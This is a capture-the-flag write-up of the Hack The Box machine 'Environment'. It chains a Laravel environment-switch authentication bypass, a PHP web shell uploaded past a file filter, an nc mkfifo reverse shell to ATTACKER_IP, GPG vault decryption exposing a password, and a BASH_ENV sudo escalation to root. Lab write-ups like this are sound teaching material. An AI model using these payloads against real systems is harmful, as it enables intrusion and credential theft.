## üìù Summary

A hidden `/login` page on the Environment web server exposed an SQL injection vulnerability in the `remember` parameter. The error messages were overly verbose and even revealed a code snippet showing that authentication could be bypassed by simply switching the Laravel environment to `preprod`.

This allowed me to access the administrative dashboard as user Hish. The dashboard included a profile picture upload feature, which I abused and bypassed the file validation checks to upload a web shell.  With the web shell in place, I achieved remote code execution (RCE) and upgraded to a fully interactive reverse shell as user www-data.

Weak permissions on Hish‚Äôs home directory allowed www-data to read sensitive files, including his GPG private key and a password vault. The vault was unlocked with the exposed private key, revealing Hish‚Äôs SSH password.

I then logged in over SSH as Hish and found that he could run `/usr/bin/systeminfo` with `sudo`. The script couldn‚Äôt be modified, and nothing inside it was interactive, but since the `BASH_ENV` environment variable was preserved in `sudo`, I was able to abuse it and escalate to a root shell.

## üîì‚ö° Authentication bypass

### üîé Recon

**Initial scan** revealed only two ports open:
- `22/tcp`: OpenSSH 9.2p1
- `80/tcp`: nginx 1.22.1

After pointing `environment.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/environment$ grep environment.htb /etc/hosts

```

I open the site and find a website about preserving the environment.

![](images/Pasted%20image%2020250720162709.png)

Fuzzing the website using `ffuf` reveals a `/login` endpoint/page.

I navigate to `/login` and login with fake credentials, but intercept the traffic with Burp Suite.

![](images/Pasted%20image%2020250720162258.png)

The single-quote SQL injection detection payload is added to each parameter and finally added to the `remember` parameter.  Forwarding the login form and then stopping Interception mode reveals something really interesting...

![](images/Pasted%20image%2020250720162420.png)

An extremely verbose error message is displayed that reveals that `Laravel 11.30.0` is used.
It also reveals a code block in the `routes/web.php` file that states that if the environment is `preprod`, then authentication should be bypassed and the user id should be set to 1.  I presume this is an administrator user.  The user is then redirected to `/management/dashboard`.

![](images/Pasted%20image%2020250720162535.png)

The message also reveals that the backend database used is SQLite.

![](images/Pasted%20image%2020250720162621.png)

SQL injections is a promising attack vector, but since the backend is running SQLite, this is very limiting and gaining remote code execution (RCE) is more complex...

Searching for `laravel 11.30.0 environment exploit poc` shows that  `Laravel 11.30.0` is vulnerable to `CVE-2024-52301` which allows the environment to be changed.  This will bypass authentication and give administrative access immediately.  This is a more promising attack vector.

### üß™ Exploitation

#### üêû CVE-2024-52301

https://github.com/Nyamort/CVE-2024-52301 explains that simply adding `?--env=preprod` to the request should change the environment to `preprod` on this machine.

I login again and intercept the request with Burp Suite.  The requested endpoint is changed to `/login?--env=preprod` and Forwarded to the server and then interception mode is disabled.

![](images/Pasted%20image%2020250720163141.png)

### üí∞ Post Exploitation

Authentication is bypassed as seen in the leaked code snippet in the verbose error message and the dashboard for user `Hish` is opened.

![](images/Pasted%20image%2020250720163205.png)

## üìÇüí£ Arbitrary File Upload

### üîé Recon

A profile picture can be uploaded for user `Hish`.

![](images/Pasted%20image%2020250720163313.png)

And can then be accessed from the URL.  The default profile picture can be accessed at http://environment.htb/storage/files/hish.png.  This gets me thinking; what if I can upload a webshell?

![](images/Pasted%20image%2020250720163340.png)

I create a simple PHP webshell.

```
fcoomans@kali:~/htb/environment$ echo -n '<?php system($_REQUEST["cmd"]); ?>' >webshell.php

fcoomans@kali:~/htb/environment$ cat webshell.php
<?php system($_REQUEST["cmd"]); ?>
```

And upload it as the profile picture.

![](images/Pasted%20image%2020250720163519.png)

But get the error message `Invalid file detected`.

![](images/Pasted%20image%2020250720182840.png)

I add `GIF89` as the header to the file and change the PHP code to display `Hello World!`.

```
fcoomans@kali:~/htb/environment$ echo -e 'GIF89\n<?php echo("Hello World!"); ?>' >hello.gif

fcoomans@kali:~/htb/environment$ cat hello.gif
GIF89
<?php echo("Hello World!"); ?>
```

The file is now detected as a GIF image file.

```
fcoomans@kali:~/htb/environment$ file hello.gif 
hello.gif: GIF image data 16188 x 26736
```

I upload `hello.gif`, but when I try to access the file using `curl`, notice that the file is not executed, but the PHP code is printed instead.  The extension has to be changed to something that PHP can execute.

```
fcoomans@kali:~/htb/environment$ curl -s "http://environment.htb/storage/files/hello.gif"
GIF89
<?php echo("Hello World!"); ?>
```

Adding a double-extension with a space reveals a crucial piece of information;  `hello .php .gif` is saved as `hello .php.gif`.  What happened to the second space?  It looks like the application removed it!

![](images/Pasted%20image%2020250720183107.png)

I try the filename `hello.php .` and the file gets uploaded as `hello.php`.

![](images/Pasted%20image%2020250720183158.png)

The file is accessed using `curl` and this time the source code is not displayed, but executed instead and `Hello World!` is displayed.

```
fcoomans@kali:~/htb/environment$ curl -s "http://environment.htb/storage/files/hello.php"
GIF89
Hello World!
```

### üß™ Exploitation

#### üêö Webshell

I create an MD5 hash of my name.  I then add the basic PHP webshell `<?php system($_REQUEST["cmd"]); ?>` to a GIF file, where the filename is the MD5 hash of my name.

```
fcoomans@kali:~/htb/environment$ echo -n 'fcoomans' |md5sum
8f01f44e140d7b693b4a655ad4e9de9b  -

fcoomans@kali:~/htb/environment$ echo -e 'GIF89\n<?php system($_REQUEST["cmd"]); ?>' >8f01f44e140d7b693b4a655ad4e9de9b.gif

fcoomans@kali:~/htb/environment$ cat 8f01f44e140d7b693b4a655ad4e9de9b.gif
GIF89
<?php system($_REQUEST["cmd"]); ?>
```

I upload the file and then use Burp Suite `Repeater` to change the file name to `8f01f44e140d7b693b4a655ad4e9de9b.php .` and it gets uploaded to http://environment.htb/storage/files/8f01f44e140d7b693b4a655ad4e9de9b.php.

![](images/Pasted%20image%2020250720184446.png)

Accessing the URL using `curl` and passing in the parameter `cmd=id`, prints the user information for user `www-data`.

```
fcoomans@kali:~/htb/environment$ curl -s "http://environment.htb/storage/files/8f01f44e140d7b693b4a655ad4e9de9b.php?cmd=id"
GIF89
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I use https://www.revshells.com to generate a `nc mkfifo` reverse shell.  The payload is URL encoded and when executed will spawn a `bash` shell on the target.

![](images/Pasted%20image%2020250720184731.png)

A `nc` listener is started on the attack host.

```
fcoomans@kali:~/htb/environment$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

And the reverse shell is passed to the `cmd` parameter in my webshell.

```
fcoomans@kali:~/htb/environment$ curl -s "http://environment.htb/storage/files/8f01f44e140d7b693b4a655ad4e9de9b.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20ATTACKER_IP%204444%20%3E%2Ftmp%2Ff"
```

### üí∞ Post Exploitation

#### üë£ Foothold as www-data

The `nc` listener catches the reverse shell. 

```
fcoomans@kali:~/htb/environment$ rlwrap nc -lvnp 4444

## üîº Priv Esc to Hish

### üîé Recon

Looking at `/etc/passwd` shows that the only relevant users with shell access is `root` and user Hish.

```
www-data@environment:~/app$ grep sh /etc/passwd
grep sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
hish:x:1000:1000:hish,,,:/home/hish:/bin/bash
```

I search for the SQLite database used by the web application and find it under `database/database.sqlite`.

```
www-data@environment:~/app$ find . -iname '*.sqlite'
find . -iname '*.sqlite'
./database/database.sqlite
```

The simply Python code snippet `import pty;pty.spawn("/bin/bash")` spawns an interactive PTY bash shell.

```
www-data@environment:~/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

`sqlite3` is then used to access the SQLite database.  The user password hashes for the users are dumped.  I couldn't crack Hish's password hash.

```
www-data@environment:~/app$ sqlite3 ./database/database.sqlite
sqlite3 ./database/database.sqlite

```

I then noticed that `www-data` can access Hish's home directory, due to weak permissions on the home directory.  I notice some GPG private keys and a `~/backup/keyvault.gpg` file.

```
www-data@environment:~/app$ find /home/hish

The temporary directory `/tmp/fc` is created.

```
www-data@environment:~/app$ mkdir /tmp/fc
mkdir /tmp/fc
www-data@environment:~/app$ cd /tmp/fc
cd /tmp/fc
```

Hish's `~/.gnupg` directory is then copied to the temporary directory and the permissions are changed to `700`, otherwise GPG won't read the files due to weak permissions.

```
www-data@environment:/tmp/fc$ cp -r /home/hish/.gnupg/* .

```

GPG is used to list the keys and the private key is then used to decrypt the `/home/hish/backup/keyvault.gpg` Key Vault.  This reveals some passwords for Hish and in particular the password `marineSPm@ster!!` for `ENVIRONMENT.HTB`.

```

## üîº Priv Esc to Root

### üîé Recon

`sudo -l` shows that Hish can access the program `/usr/bin/systeminfo` as `root`.  Interestingly, the environment variables `ENV` and `BASE_ENV` is kept when `sudo` is used to run the program.

```
hish@environment:~$ sudo -l
[sudo] password for hish:
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

`/usr/bin/systeminfo` is a Bash script, that is only readable by user Hish.

```
hish@environment:~$ ls -lh /usr/bin/systeminfo
-rwxr-xr-x 1 root root 452 Jan 12  2025 /usr/bin/systeminfo
hish@environment:~$ file /usr/bin/systeminfo
/usr/bin/systeminfo: Bourne-Again shell script, ASCII text executable
```

I look at the file and don't see anything that can be exploited as nothing is run interactively.

```bash
hish@environment:~$ nl -b a /usr/bin/systeminfo

     2  echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"

When Bash is started non-interactively, to run a shell script, for example, it looks for the variable¬†`BASH_ENV`¬†in the environment, expands its value if it appears there, and uses the expanded value as the name of a file to read and execute.
```

So, `BASH_ENV` points to a script that will be executed before the non-interactive program is run.

### üß™ Exploitation

I create a simple `root.sh` file that will start a Bash shell.  `chmod` is used to make the file executable.

```
hish@environment:~$ echo -e '#!/bin/bash\n/bin/bash' >/dev/shm/root.sh
hish@environment:~$ cat /dev/shm/root.sh
#!/bin/bash
/bin/bash
hish@environment:~$ chmod +x /dev/shm/root.sh
```

The `BASH_ENV` environment variable is then pointed to the `root.sh` file. 

```
hish@environment:~$ export BASH_ENV=/dev/shm/root.sh
```

Running the program `/usr/bin/systeminfo` with `sudo` causes the script in `BASH_ENV` to run.  This script runs the program `/bin/bash` as the `root` user (due to `sudo`) and gives me a root shell.

```
hish@environment:~$ sudo /usr/bin/systeminfo
/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
root@environment:/home/hish# id
uid=0(root) gid=0(root) groups=0(root)
```

### üí∞ Post Exploitation

#### üèÜ root.txt

`root` is the holder of the `root.txt` flag.

```
root@environment:~# cat /root/root.txt
8c62b077a5eb1587235aa26582101e2d
```

Proof that a weak Environment can be fatal. üå±üíÄ

## üìö Lessons Learned

- **Verbose error messages** can leak sensitive details about the application and its logic. Error handling should be generic in production to avoid giving attackers clues.
- **Outdated frameworks** (like Laravel in this case) often contain known vulnerabilities and should be kept updated to the latest secure version.
- **Weak file validation** allowed me to upload a web shell. File upload features should strictly validate file types and never allow direct execution of uploaded files.
- **Loose home directory permissions** exposed private keys and password vaults. User directories should be properly secured to prevent unauthorized access.
- **Storing passwords inside GPG vaults** on the same host with accessible private keys defeats the purpose of encryption and creates a single point of failure.
- **Sudo permissions on non-interactive scripts** may seem harmless, but if environment variables like `BASH_ENV` are preserved, they can be abused for privilege escalation.
